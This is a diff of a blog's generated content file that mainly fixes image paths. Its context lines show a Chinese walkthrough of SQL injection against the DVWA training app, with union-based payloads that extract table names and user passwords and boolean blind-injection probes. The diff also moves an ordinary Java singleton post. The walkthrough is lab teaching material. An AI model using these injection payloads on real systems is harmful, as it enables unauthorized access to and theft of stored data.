@@ -357,7 +357,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <p>输入1，正常回显；输入1’报错，说明有注入点</p>
 </blockquote>
 <figure class="image-box">
-                <img src="\img\sql注入\1597150763322.png" alt="1597150763322" title class>
+                <img src="/img/sql注入/1597150763322.png" alt="1597150763322" title class>
                 <p>1597150763322</p>
             </figure>
 
@@ -367,7 +367,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; order 1#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597151437412.png" alt="1597151437412" title class>
+                <img src="/img/sql注入/1597151437412.png" alt="1597151437412" title class>
                 <p>1597151437412</p>
             </figure>
 
@@ -377,7 +377,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select 1,2#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597151508527.png" alt="1597151508527" title class>
+                <img src="/img/sql注入/1597151508527.png" alt="1597151508527" title class>
                 <p>1597151508527</p>
             </figure>
 
@@ -386,7 +386,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select database(),version()#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597151782271.png" alt="1597151782271" title class>
+                <img src="/img/sql注入/1597151782271.png" alt="1597151782271" title class>
                 <p>1597151782271</p>
             </figure>
 
@@ -395,7 +395,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select 1,schema_name from information_schema.schemata#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597152579142.png" alt="1597152579142" title class>
+                <img src="/img/sql注入/1597152579142.png" alt="1597152579142" title class>
                 <p>1597152579142</p>
             </figure>
 
@@ -404,7 +404,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select 1,table_name from information_schema.tables where table_schema=&quot;dvwa&quot;#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597153650280.png" alt="1597153650280" title class>
+                <img src="/img/sql注入/1597153650280.png" alt="1597153650280" title class>
                 <p>1597153650280</p>
             </figure>
 
@@ -413,7 +413,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select 1,column_name from information_schema.columns where table_name=&quot;users&quot;#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597153814658.png" alt="1597153814658" title class>
+                <img src="/img/sql注入/1597153814658.png" alt="1597153814658" title class>
                 <p>1597153814658</p>
             </figure>
 
@@ -422,19 +422,19 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select user,password from users#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597154167541.png" alt="1597154167541" title class>
+                <img src="/img/sql注入/1597154167541.png" alt="1597154167541" title class>
                 <p>1597154167541</p>
             </figure>
 
 <h5 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h5><blockquote>
 <p>这里限制了输入，我们需要抓包进行修改</p>
 </blockquote>
-<p> <img src="%5Cimg%5Csql%E6%B3%A8%E5%85%A5%5C1597157686281.png" alt="1597157686281"></p>
+<p> <img src="/img/sql%E6%B3%A8%E5%85%A5/1597157686281.png" alt="1597157686281"></p>
 <blockquote>
 <p>和前面一样尝试我们发现，但这里是整数型不需要闭合，其余都和前面都一样，所以查看数据的具体步骤就省略了</p>
 </blockquote>
 <figure class="image-box">
-                <img src="\img\sql注入\1597157823757.png" alt="1597157823757" title class>
+                <img src="/img/sql注入/1597157823757.png" alt="1597157823757" title class>
                 <p>1597157823757</p>
             </figure>
 
@@ -442,27 +442,27 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <p>这里跳转到另外一个界面输入信息，防止了自动化SQL注入，但是方法依旧和(LOW)级别一样，只是换了个位置输入，过程就不演示啦。</p>
 </blockquote>
 <figure class="image-box">
-                <img src="\img\sql注入\1597158059688.png" alt="1597158059688" title class>
+                <img src="/img/sql注入/1597158059688.png" alt="1597158059688" title class>
                 <p>1597158059688</p>
             </figure>
 
 <figure class="image-box">
-                <img src="\img\sql注入\1597158084811.png" alt="1597158084811" title class>
+                <img src="/img/sql注入/1597158084811.png" alt="1597158084811" title class>
                 <p>1597158084811</p>
             </figure>
 
 <figure class="image-box">
-                <img src="\img\sql注入\1597158559411.png" alt="1597158559411" title class>
+                <img src="/img/sql注入/1597158559411.png" alt="1597158559411" title class>
                 <p>1597158559411</p>
             </figure>
 
 <h4 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h4><h5 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h5><figure class="image-box">
-                <img src="\img\sql注入\1597160077983.png" alt="1597160077983" title class>
+                <img src="/img/sql注入/1597160077983.png" alt="1597160077983" title class>
                 <p>1597160077983</p>
             </figure>
 
 <figure class="image-box">
-                <img src="\img\sql注入\1597160098860.png" alt="1597160098860" title class>
+                <img src="/img/sql注入/1597160098860.png" alt="1597160098860" title class>
                 <p>1597160098860</p>
             </figure>
 
@@ -471,13 +471,13 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and (length(database()))&lt;4#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597161173004.png" alt="1597161173004" title class>
+                <img src="/img/sql注入/1597161173004.png" alt="1597161173004" title class>
                 <p>1597161173004</p>
             </figure>
 
 <p><code>1&#39; and (length(database()))&lt;5#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597161192485.png" alt="1597161192485" title class>
+                <img src="/img/sql注入/1597161192485.png" alt="1597161192485" title class>
                 <p>1597161192485</p>
             </figure>
 
@@ -486,13 +486,13 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and (ascii(substr(database(),1,1)))&gt;100#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597161443050.png" alt="1597161443050" title class>
+                <img src="/img/sql注入/1597161443050.png" alt="1597161443050" title class>
                 <p>1597161443050</p>
             </figure>
 
 <p><code>1&#39; and (ascii(substr(database(),1,1)))&gt;99#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597161459673.png" alt="1597161459673" title class>
+                <img src="/img/sql注入/1597161459673.png" alt="1597161459673" title class>
                 <p>1597161459673</p>
             </figure>
 
@@ -501,13 +501,13 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and(length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&lt;10#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597162575060.png" alt="1597162575060" title class>
+                <img src="/img/sql注入/1597162575060.png" alt="1597162575060" title class>
                 <p>1597162575060</p>
             </figure>
 
 <p><code>1&#39; and(length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&lt;9#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597162589046.png" alt="1597162589046" title class>
+                <img src="/img/sql注入/1597162589046.png" alt="1597162589046" title class>
                 <p>1597162589046</p>
             </figure>
 
@@ -516,13 +516,13 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;103#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597162797589.png" alt="1597162797589" title class>
+                <img src="/img/sql注入/1597162797589.png" alt="1597162797589" title class>
                 <p>1597162797589</p>
             </figure>
 
 <p><code>1&#39; and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;104#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597162862636.png" alt="1597162862636" title class>
+                <img src="/img/sql注入/1597162862636.png" alt="1597162862636" title class>
                 <p>1597162862636</p>
             </figure>
 
@@ -531,13 +531,13 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and (length((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1)))&lt;5#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597163115723.png" alt="1597163115723" title class>
+                <img src="/img/sql注入/1597163115723.png" alt="1597163115723" title class>
                 <p>1597163115723</p>
             </figure>
 
 <p><code>1&#39; and (length((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1)))&lt;4#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597163128591.png" alt="1597163128591" title class>
+                <img src="/img/sql注入/1597163128591.png" alt="1597163128591" title class>
                 <p>1597163128591</p>
             </figure>
 
@@ -546,13 +546,13 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1),1,1)))&gt;110#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597163275391.png" alt="1597163275391" title class>
+                <img src="/img/sql注入/1597163275391.png" alt="1597163275391" title class>
                 <p>1597163275391</p>
             </figure>
 
 <p><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1),1,1)))&gt;109#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597163530646.png" alt="1597163530646" title class>
+                <img src="/img/sql注入/1597163530646.png" alt="1597163530646" title class>
                 <p>1597163530646</p>
             </figure>
 
@@ -561,7 +561,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and (length(( select name from guestbook limit 0,1)))=4#</code></p>
 <figure class="image-box">
-                <img src="\img\sql注入\1597163675016.png" alt="1597163675016" title class>
+                <img src="/img/sql注入/1597163675016.png" alt="1597163675016" title class>
                 <p>1597163675016</p>
             </figure>
 
@@ -576,7 +576,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <p>最终猜到guestbook表中的name字段，第一个内容为test</p>
 </blockquote>
 <h5 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h5><figure class="image-box">
-                <img src="\img\sql注入\1597162058638.png" alt="1597162058638" title class>
+                <img src="/img/sql注入/1597162058638.png" alt="1597162058638" title class>
                 <p>1597162058638</p>
             </figure>
 
@@ -587,7 +587,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <p>和前面一样的作用，只是为了防止自动化SQL注入</p>
 </blockquote>
 <figure class="image-box">
-                <img src="\img\sql注入\1597162129663.png" alt="1597162129663" title class>
+                <img src="/img/sql注入/1597162129663.png" alt="1597162129663" title class>
                 <p>1597162129663</p>
             </figure>
 
@@ -2944,43 +2944,6 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
     </entry>
     
     <entry>
-      <title><![CDATA[Java单例设计]]></title>
-      <url>/2019/10/05/Java%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1/</url>
-      <content type="html"><![CDATA[<h1 id="单例设计"><a href="#单例设计" class="headerlink" title="单例设计"></a>单例设计</h1><p><code>通过单例模式的方法创建的类在当前进程中只有一个实例，并且自行实例化向整个系统提供</code></p>
-<ul>
-<li>饿汉式</li>
-</ul>
-<blockquote>
-<p>自动加载</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton() ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">return</span> INSTANCE ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>懒汉式</li>
-</ul>
-<blockquote>
-<p>第一次使用才加载</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Singleton instance ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;	<span class="comment">// 第一次使用</span></span><br><span class="line">			instance = <span class="keyword">new</span> Singleton() ; <span class="comment">// 实例化对象</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> instance ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      
-        <categories>
-            
-            <category> Java </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> Java </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
       <title><![CDATA[Java-IO]]></title>
       <url>/2019/10/05/Java-IO/</url>
       <content type="html"><![CDATA[<h1 id="转换流"><a href="#转换流" class="headerlink" title="转换流"></a>转换流</h1><ul>
@@ -3064,6 +3027,43 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedWriter</span><span class="params">(Writer out)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedWriter</span><span class="params">(Writer out, <span class="keyword">int</span> size)</span></span></span><br></pre></td></tr></table></figure>
 
 <h1 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Scanner</span><span class="params">(InputStream source)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>;<span class="comment">//判断是否还有数据</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">next</span><span class="params">()</span></span>;<span class="comment">//取出数据</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      
+        <categories>
+            
+            <category> Java </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Java </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Java单例设计]]></title>
+      <url>/2019/10/05/Java%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1/</url>
+      <content type="html"><![CDATA[<h1 id="单例设计"><a href="#单例设计" class="headerlink" title="单例设计"></a>单例设计</h1><p><code>通过单例模式的方法创建的类在当前进程中只有一个实例，并且自行实例化向整个系统提供</code></p>
+<ul>
+<li>饿汉式</li>
+</ul>
+<blockquote>
+<p>自动加载</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton() ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">return</span> INSTANCE ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>懒汉式</li>
+</ul>
+<blockquote>
+<p>第一次使用才加载</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Singleton instance ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;	<span class="comment">// 第一次使用</span></span><br><span class="line">			instance = <span class="keyword">new</span> Singleton() ; <span class="comment">// 实例化对象</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> instance ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       
